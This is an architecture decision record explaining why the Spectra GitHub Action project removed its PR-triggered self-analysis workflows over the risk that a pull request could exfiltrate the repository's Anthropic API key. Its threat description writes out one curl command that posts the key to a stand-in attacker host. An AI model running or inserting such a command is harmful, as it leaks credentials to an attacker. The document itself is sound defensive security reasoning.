# ADR-010: No Self-Dogfood — Token-Abuse Risk on PR-Triggered Workflows

## Status

Accepted (2026-04-27)

## Context

[ADR-007](ADR-007-github-action-distribution.md) shipped Spectra as a composite GitHub Action (`spectra-ai/spectra@v1`). The natural next step is the dogfood loop: run the Action on this repository's own pull requests so every Spectra commit is graded by Spectra itself. ADR-007 explicitly mentioned this as a positive consequence: "Dogfood loop closed. `.github/workflows/spectra.yml` runs the Action on Spectra itself for every PR."

The dogfood workflow shipped — and almost immediately we hit a problem that made us delete it:

**A PR-triggered workflow that needs `secrets.ANTHROPIC_API_KEY` is a token-leak vector.**

The mechanics:

1. The Action requires an Anthropic API key as input (it's how it pays for the LLM calls).
2. Storing the key as a repository secret and passing it through the workflow file is the obvious wiring.
3. On a `pull_request` event, GitHub Actions runs the workflow under the *base* repository's permissions but executes the workflow file from the *head* (PR) ref. If a contributor opens a PR that modifies `.github/workflows/spectra.yml`, the modified workflow runs.
4. A modified workflow can `curl -X POST $ATTACKER --data "$ANTHROPIC_API_KEY"` and exfiltrate the key in milliseconds.
5. GitHub mitigates this for public repos by *not* exposing secrets to workflow runs from forks by default. But:
   - `pull_request_target` triggers DO expose secrets (this is the documented attack vector — `pwn-request`).
   - Even on plain `pull_request`, contributors with write access (maintainers, bots) can run workflows that see the secret.
   - The mitigation depends on consistent configuration; one regression makes the secret leakable.

For a publisher repository whose API key bills against the maintainer's account at thousands of dollars per month at full load, leaking it is a tier-1 incident. The blast radius is bounded only by how fast we can rotate.

There were three workflows in `.github/workflows/` that put us in this position:

- `spectra.yml` — runs Spectra on every PR (the canonical dogfood)
- `spectra-analyze.yml` — variant that also uploaded the report as an artifact
- `example-usage.yml` — purported "example" that, by virtue of being checked in, also ran on PR

All three needed `secrets.ANTHROPIC_API_KEY`. None of them produced output that wasn't replicable by a contributor running `spectra analyze .` locally with their own key.

## Decision

**Delete all three PR-triggered workflows from this repository. Do not add a self-application of the Action to any branch protection or CI gate. Document the decision so future contributors don't re-introduce it under good intentions.**

The Action itself is published, exercised externally, and supported normally. Only the *self-application* on this repository is gone.

### What we keep

- `.github/workflows/ci.yml` — runs `pytest`, `ruff`, `mypy` on every PR. **Does not** need `ANTHROPIC_API_KEY`. Standard CI.
- `.github/workflows/publish.yml` — publishes to PyPI on a tag push. Uses `PYPI_API_TOKEN`, scoped to `release` events on protected branches. The relevant attacker model (PR can modify the workflow) does not apply.
- The Action manifest itself — `action.yml` at the repo root. This is the published artifact; consumers reference it as `spectra-ai/spectra@v1`.

### What we removed

- `.github/workflows/spectra.yml` — the dogfood self-analysis
- `.github/workflows/spectra-analyze.yml` — the artifact-uploading variant
- `.github/workflows/example-usage.yml` — the "example" that ran on PR

### Documentation we added

- README and `docs/github-action.md` say up front: "wire this Action into your repository with your API key." We don't show a copy-pasteable workflow that points the Action at this repo.
- This ADR.
- A note in [ADR-007](ADR-007-github-action-distribution.md) (which originally claimed the dogfood loop was closed) is *not* edited — ADRs are append-only. ADR-010 supersedes that specific claim by being the more recent decision on the same topic.

### Future testing model

How do we exercise the Action without self-application?

1. **Unit tests for the Action manifest.** `act` (the local Actions runner) can replay the composite Action steps against a fixture repository in CI. We do this in `ci.yml` against a pinned fixture.
2. **A separate test repo.** A tiny private repo (`spectra-ai/spectra-action-test`) holds a workflow that uses `spectra-ai/spectra@main` against itself. The API key lives in *that* repo's secrets — a leak there only burns a low-traffic test repo's budget, not the publisher's. We rotate the test repo's key on a schedule.
3. **Pre-release smoke tests.** Before tagging a new `@vN`, a maintainer runs `spectra analyze .` locally with their own key and pastes the grade in the release PR. Manual but cheap.

## Consequences

### Positive

- **The token-leak attack surface is closed.** No PR-triggered workflow needs `ANTHROPIC_API_KEY` in this repo. A malicious PR cannot exfiltrate a key that isn't in scope.
- **The mental model for contributors is simpler.** "PRs run pytest/ruff/mypy. They don't run Spectra." No surprise that `pull_request_target` configurations exist.
- **No false sense of security from `pull_request_target` not being used.** The decision doesn't depend on us getting the YAML configuration right forever — there is no workflow to misconfigure.
- **The Action keeps shipping normally.** Downstream consumers get the same `@v1` they always have, and most of them *do* use their own API keys against their own PRs (which is the supported model).

### Negative

- **No automatic Spectra grade on this repo's PRs.** Maintainers who want to see the grade run `spectra analyze .` locally. This is a small productivity loss for the team that lives in `spectra/`.
- **The README cannot show a copy-paste "see how we use it" workflow that points at this repo.** Consumers see the Action documented in the abstract; they have to paste it into their own repo to see it work.
- **External Action testing has more steps.** `act` for unit tests, a separate test repo for end-to-end, manual pre-release smoke. Each of those is straightforward but they add up.

### Neutral

- A future world where Anthropic offers OIDC-based, scoped, single-call API keys would let us re-evaluate. The attack vector is "static long-lived secret in a workflow" — eliminate the static secret and the calculus changes. Not on the roadmap as of 2026-04-29.
- The decision applies to *this* repository (the publisher of the Action). Downstream consumers face the same risk class but at a much smaller blast radius (their own org's key, not the publisher's), and they are free to make their own call.

## Alternatives Considered

| Alternative | Verdict |
|-------------|---------|
| **Keep the dogfood workflow; require all maintainers to be vigilant about `pull_request_target`.** | Rejected. Vigilance is not an engineering control. One review miss leaks the key. The blast radius is too high. |
| **Use `pull_request` (not `pull_request_target`) and hope GitHub's fork-secret-scoping holds.** | Rejected. Contributors with write access still see the secret on internal PRs. Bots merging dependabot PRs see it too. The default is safer than `pull_request_target`, but "safer" isn't "safe." |
| **Move the Anthropic key to a separate, isolated key with a tight monthly cap.** | Rejected as the *primary* mitigation. A capped-but-leaked key is still a leaked key — the attacker pivots to abuse the budget for as much time as they have, and you eat reputational damage even if the dollar cost is bounded. We may add a cap to the key we *do* use in the test repo, but it's defense-in-depth, not a substitute for keeping the key out of PR-triggered workflows on the publisher repo. |
| **Use a GitHub App with scoped, short-lived tokens instead of a static secret.** | Out of scope for v1. The Action takes an Anthropic API key, not a GitHub token. The relevant secret is the Anthropic key, and Anthropic doesn't offer OIDC-issued short-lived keys (as of 2026-04-29). When they do, we revisit. |
| **Run the dogfood workflow only on push events to `main`, never on PRs.** | Partially adopted via the test repo. We don't gate on it for this repo because the same key still has to live in this repo's secrets, and any future PR-triggered workflow regresses the decision silently. The test-repo isolation is cleaner. |
| **Trust contributors and require all PRs to come from members of the GitHub org.** | Rejected. Closing the contribution model to non-members defeats the point of an open-source publisher. |

## References

- Code (deleted): `.github/workflows/spectra.yml`, `.github/workflows/spectra-analyze.yml`, `.github/workflows/example-usage.yml`
- Code (kept): `.github/workflows/ci.yml`, `.github/workflows/publish.yml`, `action.yml`
- Diagram: [`docs/diagrams/github-action-flow.md`](../../diagrams/github-action-flow.md) — includes the token-abuse attack scenario this ADR mitigates
- Related: [ADR-007](ADR-007-github-action-distribution.md) — the Action distribution decision; this ADR supersedes its "Dogfood loop closed" positive consequence
- GitHub docs (read at decision time): "Keeping your GitHub Actions and workflows secure: Preventing pwn requests" — Github Security Lab, 2020-08-13
- Commit: `71d93e4 chore(ci): drop self-analysis workflows to avoid API-key abuse (#14)`

---

*Last updated: 2026-04-29.*
